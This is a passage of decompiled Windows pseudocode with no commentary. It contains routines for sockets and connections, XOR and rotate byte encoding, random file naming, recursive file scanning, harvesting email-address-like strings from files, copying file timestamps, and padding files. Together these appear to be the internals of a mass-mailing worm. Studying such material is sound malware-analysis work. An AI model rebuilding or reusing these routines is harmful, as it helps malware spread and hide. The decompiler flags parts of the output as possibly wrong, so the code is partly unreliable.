    v8 = *(_DWORD *)(this + 24) + v5;
    *(_DWORD *)(this + 20) = v8;
    result = sub_407F8F(v8);
    v7 = (unsigned int)result;
    if ( !result )
    {
      *(_DWORD *)(this + 420) = -2147483646;
      return result;
    }
    memset(result, 0, *(_DWORD *)(this + 20));
    sub_407FE0(v7, *(_BYTE **)(this + 16), (unsigned int)&v3[-*(_DWORD *)(this + 16)]);
    sub_407BEB(*(LPVOID *)(this + 16));
    *(_DWORD *)(this + 16) = v7;
  }
  sub_407750();
  return (void *)++*(_DWORD *)(this + 12);
}

//----- (0040317D) --------------------------------------------------------
void *__thiscall sub_40317D(void *this, char *Str)
{
  const char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  void *result; // eax
  unsigned int v7; // ebx
  size_t v8; // [esp-4h] [ebp-14h]
  unsigned int v9; // [esp+Ch] [ebp-4h]

  v3 = (const char *)*((_DWORD *)this + 1);
  v9 = 0;
  for ( i = strlen(Str); v9 < *(_DWORD *)this; v3 += strlen(v3) + 1 )
    ++v9;
  v5 = *((_DWORD *)this + 2);
  if ( (unsigned int)&v3[i - *((_DWORD *)this + 1)] > v5 )
  {
    v8 = *((_DWORD *)this + 6) + v5;
    *((_DWORD *)this + 2) = v8;
    result = sub_407F8F(v8);
    v7 = (unsigned int)result;
    if ( !result )
    {
      *((_DWORD *)this + 105) = -2147483646;
      return result;
    }
    memset(result, 0, *((_DWORD *)this + 2));
    sub_407FE0(v7, *((_BYTE **)this + 1), (unsigned int)&v3[-*((_DWORD *)this + 1)]);
    sub_407BEB(*((LPVOID *)this + 1));
    *((_DWORD *)this + 1) = v7;
  }
  sub_407750();
  return (void *)++*(_DWORD *)this;
}

//----- (00403222) --------------------------------------------------------
BOOL __thiscall sub_403222(SOCKET *this, int a2, __int16 a3, int a4)
{
  __int16 v4; // bx
  SOCKET v6; // eax
  struct WSAData WSAData; // [esp+8h] [ebp-190h] BYREF

  v4 = 1;
  WSAStartup(2u, &WSAData);
  if ( a3 == 2 )
    v4 = 2;
  v6 = socket(2, v4, 6);
  *this = v6;
  return v6 != -1;
}

//----- (0040326C) --------------------------------------------------------
int __thiscall sub_40326C(SOCKET *this, char *Str, int hostshort)
{
  struct sockaddr name; // [esp+4h] [ebp-10h] BYREF

  *(_WORD *)name.sa_data = htons(hostshort);
  name.sa_family = 2;
  sub_40330F(Str, (int)&hostshort);
  *(_DWORD *)&name.sa_data[2] = hostshort;
  if ( !connect(*this, &name, 16) )
    return 1;
  WSAGetLastError();
  return 0;
}

//----- (004032CF) --------------------------------------------------------
int __thiscall sub_4032CF(SOCKET *this, char *buf, int len, int flags)
{
  return send(*this, buf, len, flags);
}

//----- (004032E6) --------------------------------------------------------
int __thiscall sub_4032E6(SOCKET *this, char *buf, int len, int flags)
{
  return recv(*this, buf, len, flags);
}

//----- (004032FD) --------------------------------------------------------
int __thiscall sub_4032FD(SOCKET *this)
{
  closesocket(*this);
  return WSACleanup();
}

//----- (0040330B) --------------------------------------------------------
int sub_40330B()
{
  return 1;
}

//----- (0040330F) --------------------------------------------------------
int __stdcall sub_40330F(char *Str, int a2)
{
  signed int v2; // esi
  int v3; // ebx
  char v4; // al
  struct hostent *v6; // esi
  int i; // eax
  int v8; // [esp+10h] [ebp-4h]

  v2 = 0;
  v3 = 1;
  v8 = 0;
  if ( (int)strlen(Str) <= 0 )
    return 0;
  do
  {
    v4 = Str[v2];
    if ( v4 == 46 )
    {
      ++v8;
    }
    else if ( v4 < 48 || v4 > 57 )
    {
      v3 = 0;
    }
    ++v2;
  }
  while ( v2 < (int)strlen(Str) );
  if ( v3 )
  {
    if ( v8 != 3 )
      return 0;
    sub_4033A1((int)Str, a2);
  }
  else
  {
    v6 = gethostbyname(Str);
    WSAGetLastError();
    if ( v6 )
    {
      for ( i = 0; i < 4; ++i )
        *(_BYTE *)(i + a2) = (*v6->h_addr_list)[i];
    }
  }
  return 1;
}

//----- (004033A1) --------------------------------------------------------
char __stdcall sub_4033A1(int a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  _BYTE *v4; // edi
  char result; // al
  int i; // [esp+Ch] [ebp-4h]

  v2 = a1;
  v3 = 0;
  for ( i = 0; i < 4; ++i )
  {
    v4 = (_BYTE *)(v3 + v2);
    sscanf((const char *const)(v3 + v2), "%d", &a1);
    result = i;
    *(_BYTE *)(i + a2) = a1;
    if ( i == 3 )
      break;
    ++v3;
    if ( *v4 != 46 )
    {
      do
      {
        result = *(_BYTE *)(v3 + v2);
        ++v3;
      }
      while ( result != 46 );
    }
  }
  return result;
}

//----- (004033F4) --------------------------------------------------------
int __cdecl sub_4033F4(char *Dest, char *Str, int a3, int a4)
{
  char *v4; // esi
  size_t v5; // edi
  size_t v7; // [esp+Ch] [ebp-4h]

  v4 = Dest;
  v7 = strlen(Str);
  while ( 1 )
  {
    v5 = strlen(v4);
    if ( !v5 || a3 && v4 - Dest >= a3 )
      break;
    if ( a4 && !_strcmpi(v4, Str) )
      return -1;
    v4 += v5 + 1;
  }
  if ( (int)(v4 - Dest + v7 + 2) > a3 && a3 )
    return 0;
  sub_407750();
  v4[strlen(v4) + 1] = 0;
  return 1;
}

//----- (0040347E) --------------------------------------------------------
char *__cdecl sub_40347E(char *Str, int a2)
{
  int i; // edi

  for ( i = 0; i < a2; Str += strlen(Str) + 1 )
  {
    if ( !strlen(Str) )
      break;
    ++i;
  }
  return Str;
}

//----- (004034AE) --------------------------------------------------------
int __cdecl sub_4034AE(char *Str, int a2)
{
  char *v2; // esi
  int i; // edi
  size_t v4; // eax

  v2 = Str;
  for ( i = 0; ; ++i )
  {
    v4 = strlen(v2);
    if ( !v4 || a2 && v2 - Str >= a2 )
      break;
    v2 += v4 + 1;
  }
  return i;
}

//----- (004034E0) --------------------------------------------------------
int __cdecl sub_4034E0(char *Str, void *Dest, int a3)
{
  int v3; // edi
  size_t v5; // esi
  char *v6; // eax
  int v7; // esi
  char *v8; // eax
  int v9; // esi
  int v10; // edi
  char *v11; // eax
  size_t v12; // [esp-10h] [ebp-20h]
  void *v13; // [esp+Ch] [ebp-4h]
  char *lpMem; // [esp+1Ch] [ebp+Ch]

  v13 = Dest;
  v3 = sub_4034AE(Str, 0);
  if ( v3 <= 0 )
    return 0;
  if ( (int)Dest < 0 )
    v13 = (void *)(sub_4047B6(0) % (unsigned int)v3);
  v5 = 2 * (sub_40347E(Str, v3 + 2) - Str);
  v6 = (char *)sub_407F8F(v5);
  v12 = v5;
  v7 = 0;
  lpMem = v6;
  memset(v6, 0, v12);
  do
  {
    if ( (void *)v7 != v13 )
    {
      v8 = sub_40347E(Str, v7);
      sub_4033F4(lpMem, v8, a3, 1);
    }
    ++v7;
  }
  while ( v7 < v3 );
  v9 = 0;
  v10 = v3 - 1;
  *(_DWORD *)Str = 0;
  if ( v10 > 0 )
  {
    do
    {
      v11 = sub_40347E(lpMem, v9);
      sub_4033F4(Str, v11, a3, 1);
      ++v9;
    }
    while ( v9 < v10 );
  }
  sub_407BEB(lpMem);
  return 1;
}
// 403542: conditional instruction was optimized away because of 'edi.4>=1'

//----- (004035A1) --------------------------------------------------------
_BYTE *__cdecl sub_4035A1(int a1)
{
  int i; // edi
  unsigned int v2; // edx
  _BYTE *result; // eax

  for ( i = 0; i < 4; ++i )
  {
    v2 = sub_4047B6(0) % (unsigned int)(i != 0 ? 256 : 8);
    result = (_BYTE *)(i + a1);
    *(_BYTE *)(i + a1) = v2;
    if ( !(_BYTE)v2 )
      *result = 1;
  }
  return result;
}

//----- (004035D8) --------------------------------------------------------
int __cdecl sub_4035D8(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = i ^ __ROL1__(v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403634) --------------------------------------------------------
int __cdecl sub_403634(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = __ROR1__(i ^ v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403690) --------------------------------------------------------
unsigned int __cdecl sub_403690(int a1)
{
  unsigned int v1; // esi

  v1 = sub_4047B6(0) % 0x1Au + 97;
  if ( a1 != 4 )
  {
    if ( a1 == 1 )
      return sub_4047B6(0) % 0xAu + 48;
    if ( (a1 & 2) != 0 )
      v1 = sub_4047B6(0) % 0x1Au + 65;
    if ( (sub_4047B6(0) & 1) != 0 && (a1 & 4) != 0 )
      v1 = sub_4047B6(0) % 0x1Au + 97;
    if ( (sub_4047B6(0) & 1) != 0 && (a1 & 1) != 0 )
      v1 = sub_4047B6(0) % 0xAu + 48;
  }
  return v1;
}

//----- (0040372F) --------------------------------------------------------
int __cdecl sub_40372F(_BYTE *a1, int a2, int a3, int a4)
{
  int v4; // esi
  int i; // edi

  v4 = a2;
  if ( a3 > a2 )
    v4 = a2 + sub_4047B6(0) % (unsigned int)(a3 - a2);
  for ( i = 0; i < v4; ++i )
    a1[i] = sub_403690(a4);
  *a1 = sub_403690(2);
  a1[i] = 0;
  return 1;
}

//----- (00403783) --------------------------------------------------------
int __cdecl sub_403783(char a1)
{
  int v1; // esi

  v1 = 0;
  if ( (int)strlen(Str) <= 0 )
    return 0;
  while ( a1 != Str[v1] )
  {
    if ( ++v1 >= (int)strlen(Str) )
      return 0;
  }
  return 1;
}

//----- (004037B9) --------------------------------------------------------
int __cdecl sub_4037B9(char a1)
{
  int v1; // esi

  if ( a1 < 0 )
    return 0;
  if ( !isalpha(a1) && !isdigit(a1) )
  {
    v1 = 0;
    if ( (int)strlen(asc_40F098) > 0 )
    {
      while ( a1 != asc_40F098[v1] )
      {
        if ( ++v1 >= (int)strlen(asc_40F098) )
          return 0;
      }
      return 1;
    }
    return 0;
  }
  return 1;
}

//----- (0040380E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
BOOL __usercall sub_40380E@<eax>(HMODULE a1@<eax>)
{
  const CHAR *v2; // [esp-4h] [ebp-8h]
  _BYTE *retaddr; // [esp+4h] [ebp+0h]

  LOBYTE(a1) = *retaddr;
  return GetProcAddress(a1, v2) && retaddr[1] > 0x80u;
}
// 40382A: positive sp value 4 has been found
// 403816: variable 'v2' is possibly undefined

//----- (0040382F) --------------------------------------------------------
BOOL __cdecl sub_40382F(_BYTE *a1)
{
  return *a1 == 0xA1 || *a1 == 0xA3;
}

//----- (00403844) --------------------------------------------------------
char *__cdecl sub_403844(char *a1, _BYTE *a2, int a3, int a4, int a5, _DWORD *a6, int a7)
{
  int v8; // esi
  char *v10; // ebx
  HMODULE v11; // eax
  int v12; // ecx
  char v13; // al
  int v14; // ebx
  int v15; // ebx
  int v16; // ebx
  int v17; // [esp+804h] [ebp-4h]
  char *v18; // [esp+814h] [ebp+Ch]
  int v19; // [esp+814h] [ebp+Ch]
  char *v20; // [esp+818h] [ebp+10h]
  int v21; // [esp+828h] [ebp+20h]

  v8 = 0;
  v17 = 0;
  *a2 = 0;
  *a6 = 0;
  if ( a3 <= 0 )
    return a1 + 1;
  v10 = a1;
  v11 = (HMODULE)sub_4037B9(*a1);
  if ( !v11 )
  {
    v18 = a1;
    while ( 1 )
    {
      if ( a7 )
      {
        if ( sub_40380E(v11) && !sub_40382F(v18) )
          break;
        if ( sub_40382F(v18) )
        {
          ++v8;
          ++v18;
        }
      }
      ++v8;
      ++v18;
      if ( v8 < a3 - 1 )
      {
        v11 = (HMODULE)sub_4037B9(*v18);
        if ( !v11 )
          continue;
      }
      break;
    }
  }
  v19 = a3 - 1;
  if ( v8 < a3 - 1 )
  {
    if ( sub_4037B9(a1[v8]) )
    {
      while ( !sub_403783(a1[v8]) )
      {
        if ( ++v8 >= v19 )
          return &v10[v8];
      }
      do
      {
        if ( !sub_4037B9(a1[v8]) )
          break;
        v12 = v17;
        v13 = a1[v8];
        ++v17;
        ++v8;
        a2[v12] = v13;
        if ( v8 >= v19 )
          break;
      }
      while ( v17 < a5 - 1 );
      if ( v17 >= a5 - 1 && v17 )
      {
        do
        {
          if ( sub_403783(a2[v17]) )
            break;
          --v17;
        }
        while ( v17 );
      }
      if ( v17 >= 0 )
        a2[v17] = 0;
      v14 = 0;
      if ( *a2 )
      {
        do
        {
          if ( !sub_403783(a2[v14]) )
            break;
          ++v14;
        }
        while ( a2[v14] );
      }
      sub_407750();
      sub_407750();
      if ( v17 - v14 >= a4 )
        goto LABEL_40;
      v10 = a1;
    }
    if ( a7 )
    {
      *a2 = 0;
      v15 = 0;
      if ( sub_40380E((HMODULE)&a1[v8]) )
      {
        v21 = a3 - 2;
        v20 = &a1[v8];
        do
        {
          if ( !sub_40382F(v20) )
          {
            a2[v15] = *v20;
            v16 = v15 + 1;
            a2[v16] = v20[1];
            v15 = v16 + 1;
          }
          v8 += 2;
          v20 += 2;
        }
        while ( v8 < v21 && v15 < a5 - 2 && sub_40380E((HMODULE)(a5 - 2)) );
      }
      a2[v15] = 0;
      if ( v15 >= a4 )
      {
LABEL_40:
        *a6 = 1;
        return &a1[v8];
      }
      v10 = a1;
    }
    *a6 = 0;
  }
  return &v10[v8];
}

//----- (00403A4F) --------------------------------------------------------
BOOL __cdecl sub_403A4F(LPCSTR lpFileName, char *Str, int a3, int a4, int a5)
{
  char *v5; // eax
  char *v6; // esi
  int v7; // edx
  int v8; // ecx
  int i; // edi
  unsigned int v10; // eax
  char *v11; // edi
  char v13[4096]; // [esp+Ch] [ebp-101Ch] BYREF
  char v14[16]; // [esp+100Ch] [ebp-1Ch] BYREF
  int j; // [esp+101Ch] [ebp-Ch]
  int v16; // [esp+1020h] [ebp-8h] BYREF
  int v17; // [esp+1024h] [ebp-4h] BYREF
  int lpFileNamea; // [esp+1030h] [ebp+8h]

  sub_40174B(v14);
  *Str = 0;
  v5 = (char *)sub_40174E((int)v14, lpFileName, (int)&v16, 1);
  v6 = v5;
  if ( !v5 )
    return 0;
  v7 = v16;
  if ( (unsigned int)v16 < 0xA )
  {
LABEL_21:
    sub_401808((int)v14);
    return 0;
  }
  v13[0] = 0;
  v17 = 0;
  do
  {
    v5 = sub_403844(v5, Str, v7, a3, a4, &v17, a5);
    v8 = v16;
    v7 = (int)&v6[v16 - (_DWORD)v5];
    if ( v7 <= 5 )
    {
      *Str = 0;
      goto LABEL_21;
    }
  }
  while ( !v17 );
  lpFileNamea = 0;
  for ( i = 0; i < 10000; ++i )
  {
    v5 = sub_403844(v5, v13, (int)&v6[v8 - (_DWORD)v5], a3, a4, &v17, a5);
    if ( v17 )
      ++lpFileNamea;
    v8 = v16;
    if ( (unsigned int)&v6[v16 - (_DWORD)v5] <= 5 )
      break;
  }
  if ( lpFileNamea )
  {
    v10 = sub_4047B6(0);
    v8 = v16;
    lpFileNamea = v10 % i;
  }
  v11 = v6;
  for ( j = 0; j < 10000; ++j )
  {
    v11 = sub_403844(v11, v13, (int)&v6[v8 - (_DWORD)v11], a3, a4, &v17, a5);
    if ( v17 )
    {
      if ( !lpFileNamea )
        break;
      --lpFileNamea;
      sub_407750();
    }
    v8 = v16;
    if ( (unsigned int)&v6[v16 - (_DWORD)v11] <= 5 )
      break;
  }
  sub_401808((int)v14);
  return (int)strlen(Str) >= a3;
}

//----- (00403BB8) --------------------------------------------------------
int __cdecl sub_403BB8(int a1, int a2, char *Dest)
{
  int v3; // ebx
  _BYTE *v4; // eax

  v3 = 0;
  if ( a2 )
    *(_BYTE *)a2 = 0;
  if ( Dest )
    *Dest = 0;
  if ( *(_BYTE *)a1 != 64 )
  {
    v4 = (_BYTE *)a1;
    do
    {
      if ( !*v4 )
        break;
      if ( a2 )
        v4[a2 - a1] = *v4;
      ++v3;
      ++v4;
    }
    while ( *v4 != 64 );
  }
  if ( a2 )
    *(_BYTE *)(v3 + a2) = 0;
  if ( !*(_BYTE *)(v3 + a1) )
    return 0;
  if ( Dest )
    sub_407750();
  return 1;
}

//----- (00403C23) --------------------------------------------------------
int __cdecl sub_403C23(char a1)
{
  int v1; // eax
  char v3[4]; // [esp+Ch] [ebp-4h] BYREF

  strcpy(v3, "-_");
  if ( a1 <= 32 || a1 >= 126 )
    return 0;
  if ( !isalpha(a1) )
  {
    v1 = isdigit(a1);
    if ( !v1 && a1 != 64 && a1 != 46 )
    {
      while ( a1 != v3[v1] )
      {
        if ( ++v1 >= 2 )
          return 0;
      }
    }
  }
  return 1;
}

//----- (00403C7D) --------------------------------------------------------
int __cdecl sub_403C7D(char a1)
{
  return sub_403C23(a1);
}

//----- (00403C88) --------------------------------------------------------
char *__cdecl sub_403C88()
{
  CHAR SrcStr[4096]; // [esp+0h] [ebp-2000h] BYREF
  CHAR SubStr[4096]; // [esp+1000h] [ebp-1000h] BYREF

  sub_407750();
  sub_407750();
  _strlwr(SrcStr);
  _strlwr(SubStr);
  return strstr(SrcStr, SubStr);
}

//----- (00403CE3) --------------------------------------------------------
char *__cdecl sub_403CE3(char *Dest, int a2)
{
  char *v2; // eax

  sub_407750();
  v2 = sub_40347E(SubKey, a2);
  return strcat(Dest, v2);
}

//----- (00403D0C) --------------------------------------------------------
int __cdecl sub_403D0C(char *Str)
{
  signed int v1; // eax
  signed int v2; // edi
  int v3; // esi

  v1 = strlen(Str);
  v2 = v1;
  if ( v1 >= 4 && v1 <= 12 )
  {
    v3 = 0;
    while ( isdigit(Str[v3]) )
    {
      if ( ++v3 >= v2 )
        return 1;
    }
  }
  return 0;
}
// 403D2A: conditional instruction was optimized away because of 'eax.4 in (4..C)'

//----- (00403D4B) --------------------------------------------------------
int __cdecl sub_403D4B(char *FullPath)
{
  int v1; // edi
  int v2; // ebx
  char *v3; // eax
  char Ext[260]; // [esp+Ch] [ebp-104h] BYREF

  v1 = 0;
  _splitpath(FullPath, 0, 0, 0, Ext);
  v2 = sub_4034AE(a0yiy, 0);
  if ( v2 <= 0 )
    return _strcmpi(Ext, String2) != 0 ? -1 : -100;
  while ( 1 )
  {
    v3 = sub_40347E(a0yiy, v1);
    if ( !_strcmpi(Ext, v3) )
      break;
    if ( ++v1 >= v2 )
      return _strcmpi(Ext, String2) != 0 ? -1 : -100;
  }
  return v1;
}

//----- (00403DC6) --------------------------------------------------------
int __cdecl sub_403DC6(LPCSTR NumberOfBytesWritten, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  HANDLE v3; // edi

  v3 = CreateFileA(NumberOfBytesWritten, 0xC0000000, 3u, 0, 2u, 0x20u, 0);
  NumberOfBytesWritten = 0;
  if ( v3 == (HANDLE)-1 || !lpBuffer )
    return 0;
  WriteFile(v3, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&NumberOfBytesWritten, 0);
  CloseHandle(v3);
  return 1;
}

//----- (00403E16) --------------------------------------------------------
DWORD __cdecl sub_403E16(LPCSTR FileSizeHigh)
{
  HANDLE v1; // eax
  void *v2; // edi
  DWORD v3; // ebx

  v1 = CreateFileA(FileSizeHigh, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  FileSizeHigh = 0;
  v2 = v1;
  v3 = -1;
  if ( v1 != (HANDLE)-1 )
  {
    v3 = GetFileSize(v1, (LPDWORD)&FileSizeHigh);
    if ( FileSizeHigh )
      v3 = -1;
    CloseHandle(v2);
  }
  return v3;
}

//----- (00403E63) --------------------------------------------------------
int __cdecl sub_403E63(LPCSTR lpFileName)
{
  char v2[16]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h] BYREF

  sub_40174B(v2);
  if ( !sub_40174E((int)v2, lpFileName, (int)&v3, 1) )
    return 0;
  sub_401808((int)v2);
  return 1;
}

//----- (00403E97) --------------------------------------------------------
void __cdecl sub_403E97(LPSTR lpFileName)
{
  signed int v1; // eax
  CHAR Buffer[260]; // [esp+4h] [ebp-118h] BYREF
  CHAR PrefixString[20]; // [esp+108h] [ebp-14h] BYREF

  sub_40372F(PrefixString, 2, 5, 4);
  GetTempPathA(0x104u, Buffer);
  GetTempFileNameA(Buffer, PrefixString, 0, lpFileName);
  sub_403F05(lpFileName);
  v1 = strlen(lpFileName);
  do
    --v1;
  while ( v1 >= 0 && lpFileName[v1] != 46 );
  sub_407750();
}

//----- (00403F05) --------------------------------------------------------
BOOL __cdecl sub_403F05(LPCSTR lpFileName)
{
  SetFileAttributesA(lpFileName, 0x20u);
  return DeleteFileA(lpFileName);
}

//----- (00403F1C) --------------------------------------------------------
int __cdecl sub_403F1C(char *Source, int a2, int a3)
{
  int v3; // esi
  size_t v4; // eax
  bool v5; // zf
  CHAR *v6; // eax
  HANDLE v7; // edi
  struct _WIN32_FIND_DATAA FindFileData; // [esp+8h] [ebp-348h] BYREF
  CHAR FileName[260]; // [esp+148h] [ebp-208h] BYREF
  char Destination[260]; // [esp+24Ch] [ebp-104h] BYREF

  v3 = 0;
  sub_407750();
  v4 = strlen(FileName);
  if ( v4 )
  {
    v5 = FindFileData.cAlternateFileName[v4 + 15] == 92;
    v6 = &FindFileData.cAlternateFileName[v4 + 15];
    if ( v5 )
    {
      *v6 = 0;
      v3 = 1;
    }
  }
  strcat(FileName, asc_40F0B0);
  v7 = FindFirstFileA(FileName, &FindFileData);
  if ( v7 != (HANDLE)-1 )
  {
    do
    {
      sub_407750();
      if ( !v3 )
        strcat(Destination, asc_40F044);
      strcat(Destination, FindFileData.cFileName);
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( strcmp(FindFileData.cFileName, asc_40F0AC)
          && strcmp(FindFileData.cFileName, asc_40F0A8)
          && ((int (__cdecl *)(char *, int, int))a2)(Destination, 1, a3) )
        {
          sub_403F1C(Destination, a2, a3);
        }
      }
      else if ( !((int (__cdecl *)(char *, _DWORD, int))a2)(Destination, 0, a3) )
      {
        break;
      }
    }
    while ( FindNextFileA(v7, &FindFileData) );
    FindClose(v7);
  }
  return 0;
}

//----- (0040406E) --------------------------------------------------------
int __cdecl sub_40406E(LPCSTR lpFileName, LONG lDistanceToMove)
{
  HANDLE v2; // edi
  signed int v4; // esi
  DWORD FileSizeHigh; // [esp+Ch] [ebp-4h] BYREF
  int lpFileNamea; // [esp+18h] [ebp+8h]
  int lDistanceToMovea; // [esp+1Ch] [ebp+Ch]

  if ( lDistanceToMove < 86016 )
    return 0;
  SetFileAttributesA(lpFileName, 0x20u);
  v2 = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x20u, 0);
  if ( v2 == (HANDLE)-1 )
    return 0;
  v4 = GetFileSize(v2, &FileSizeHigh);
  if ( v4 <= lDistanceToMove )
  {
    SetFilePointer(v2, 0, 0, 2u);
    lpFileNamea = lDistanceToMove - v4;
    if ( (lDistanceToMove - v4) / 0x80000 > 0 )
    {
      lDistanceToMovea = (lDistanceToMove - v4) / 0x80000;
      do
      {
        WriteFile(v2, byte_4131D0, 0x80000u, &FileSizeHigh, 0);
        --lDistanceToMovea;
      }
      while ( lDistanceToMovea );
    }
    WriteFile(v2, byte_4131D0, lpFileNamea % 0x80000, &FileSizeHigh, 0);
  }
  else
  {
    SetFilePointer(v2, lDistanceToMove, 0, 0);
    SetEndOfFile(v2);
  }
  CloseHandle(v2);
  return 1;
}

//----- (00404138) --------------------------------------------------------
BOOL __cdecl sub_404138(LPCSTR lpFileName, LPFILETIME lpCreationTime)
{
  HANDLE v2; // esi
  BOOL v4; // edi

  v2 = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  if ( v2 == (HANDLE)-1 )
    return 0;
  v4 = GetFileTime(v2, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(v2);
  return v4;
}

//----- (00404180) --------------------------------------------------------
BOOL __cdecl sub_404180(LPCSTR lpFileName, FILETIME *lpCreationTime)
{
  HANDLE v2; // esi
  BOOL v4; // edi

  v2 = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x27u, 0);
  if ( v2 == (HANDLE)-1 )
    return 0;
  v4 = SetFileTime(v2, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(v2);
  return v4;
}

//----- (004041C8) --------------------------------------------------------
LPVOID __cdecl sub_4041C8(LPCSTR lpFileName, int a2, int a3)
{
  LPVOID result; // eax
  int v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  int v7; // eax
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = sub_40174E((int)v8, lpFileName, (int)&v9, 1);
  v4 = (int)result;
  if ( result )
  {
    if ( a3 )
    {
      if ( (unsigned int)v9 > 0x19000 )
      {
        v5 = (sub_4047B6(0) % 0xAu + 84) << 10;
        if ( v5 < v9 )
          v9 = v5;
      }
    }
    v6 = sub_407F8F(2 * v9);
    if ( v6 )
    {
      memset(v6, 0, 2 * v9);
      v7 = sub_401000(v4, (int)v6, v9, 72);
      if ( a2 )
        *(_DWORD *)a2 = v7;
    }
    sub_401808((int)v8);
    result = v6;
  }
  return result;
}

//----- (00404261) --------------------------------------------------------
void __cdecl sub_404261(void *Dest, int a2, int Source, int a4)
{
  unsigned int v5; // eax
  unsigned int v6; // eax
  char *v7; // eax
  unsigned int v8; // eax
  char *v9; // eax
  char Filename[4]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int Destination; // [esp+118h] [ebp+8h]
  unsigned int Destinationa; // [esp+118h] [ebp+8h]
  unsigned int Destinationb; // [esp+118h] [ebp+8h]

  Filename[0] = 0;
  memset(Dest, 0, 0x14u);
  if ( byte_4937EC && sub_4047B6(0) % 3u && sub_403A4F(&byte_4937EC, Filename, 3, 10, 1) )
    sub_407750();
  if ( !*(_BYTE *)Dest )
  {
    if ( FullPath && sub_4047B6(0) % 3u )
    {
      _splitpath(&FullPath, 0, 0, Filename, 0);
      sub_407750();
    }
    if ( !*(_BYTE *)Dest )
    {
      if ( (sub_4047B6(0) & 0xF) == 0 )
      {
        Destination = sub_4034AE(&aE, 0);
        v5 = sub_4047B6(0);
        sub_40347E(&aE, v5 % Destination);
        sub_407750();
      }
      if ( !*(_BYTE *)Dest )
        sub_40372F(Dest, 2, 6, 4);
    }
  }
  if ( a2 )
  {
    Destinationa = sub_4034AE(a0yiy, 0);
    v6 = sub_4047B6(0);
    v7 = sub_40347E(a0yiy, v6 % Destinationa);
    strcat((char *)Dest, v7);
  }
  if ( Source )
  {
    strcat((char *)Dest, (const char *)Source);
  }
  else if ( a4 )
  {
    Destinationb = sub_4034AE(a0, 0);
    v8 = sub_4047B6(0);
    v9 = sub_40347E(a0, v8 % Destinationb);
    strcat((char *)Dest, v9);
  }
}
// 410D74: using guessed type char aE;

//----- (004043D4) --------------------------------------------------------
int __cdecl sub_4043D4(int a1, int a2, void *Dst, size_t Size, int a5)
{
  int v5; // edi
  int v6; // esi
  char *v7; // ebx
  char *i; // eax
  __int16 v9; // bx
  signed int v10; // edi
  int v11; // eax
  signed int v13; // [esp+10h] [ebp-10h]
  int v14; // [esp+10h] [ebp-10h]
  int v15; // [esp+14h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-Ch]
  int v17; // [esp+18h] [ebp-8h]
  int v18; // [esp+18h] [ebp-8h]
  int v19; // [esp+1Ch] [ebp-4h]
  int v20; // [esp+28h] [ebp+8h]
  int v21; // [esp+2Ch] [ebp+Ch]

  v5 = -1;
  v19 = 0;
  v17 = -1;
  v13 = 0;
  v15 = 0;
  *(_DWORD *)a5 = 0;
  memset(Dst, 0, Size);
  v6 = a1;
  if ( sub_403C23(*(_BYTE *)a1) )
  {
    if ( sub_403C23(*(_BYTE *)a1) )
    {
      v7 = (char *)a1;
      for ( i = (char *)Dst - a1; ; i = (char *)Dst - a1 )
      {
        v7[(_DWORD)i] = *v7;
        if ( *v7 == 64 )
        {
          ++v15;
          v17 = v13;
        }
        if ( *v7 == 46 && v5 < 0 )
          v5 = v13;
        ++v19;
        ++v7;
        ++v13;
        if ( v19 >= a2 - 1 || v13 >= (int)(Size - 1) || !sub_403C23(*v7) )
          break;
      }
    }
    *((_BYTE *)Dst + v13) = 0;
    if ( v5 - v17 > 3 && v17 > 1 && v15 == 1 )
    {
LABEL_30:
      *(_DWORD *)a5 = 1;
      return v6 + v19;
    }
  }
  v18 = -1;
  v14 = -1;
  v19 = 0;
  v9 = *(_WORD *)a1;
  v10 = 0;
  v16 = 0;
  if ( sub_403C7D(*(_WORD *)a1) )
  {
    if ( sub_403C7D(v9) )
    {
      v11 = a2 - 1;
      v21 = 0;
      v20 = v11;
      do
      {
        *((_BYTE *)Dst + v10) = v9;
        if ( (_BYTE)v9 == 64 )
        {
          ++v16;
          v18 = v10;
        }
        if ( (_BYTE)v9 == 46 && v14 < 0 )
          v14 = v10;
        v21 += 4;
        v19 += 2;
        ++v10;
        if ( v21 >= v20 )
          break;
        if ( v10 >= (int)(Size - 1) )
          break;
        v9 = *(_WORD *)(v19 + v6);
      }
      while ( sub_403C7D(v9) );
    }
    *((_BYTE *)Dst + v10) = 0;
    if ( v14 - v18 <= 2 || v18 <= 1 || v16 != 1 )
      return v6 + v19;
    goto LABEL_30;
  }
  return a1 + 1;
}

//----- (00404555) --------------------------------------------------------
int __cdecl sub_404555(LPCSTR lpFileName, char *Dest, int a3, int a4)
{
  int v4; // ebx
  LPVOID v5; // eax
